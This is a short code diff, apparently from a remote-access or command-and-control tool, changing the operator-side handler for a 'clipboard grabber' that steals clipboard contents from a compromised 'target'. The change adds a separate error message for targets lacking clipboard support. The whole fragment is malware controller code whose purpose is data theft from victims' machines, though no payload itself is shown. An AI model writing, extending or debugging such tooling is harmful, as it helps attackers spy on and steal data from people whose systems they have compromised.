@@ -112,7 +112,17 @@ def clipboard_steal_command(
     """Entry point used by the framework to start the clipboard grabber."""
 
     message = decrypt_message(client_output, key)
-    if not message or message.decode() != "STARTED":
+    
+    if not message:
+        return colored(
+            "[-] An error has occurred when starting the clipboard steal function. Please try again in a few moments.",
+            "red",
+        )
+
+    decoded = message.decode()
+    if decoded == "NOCLIP":
+        return colored("[-] Target has no clipboard capabilities.", "red")
+    if decoded != "STARTED":
         return colored(
             "[-] An error has occurred when starting the clipboard steal function. Please try again in a few moments.",
             "red",
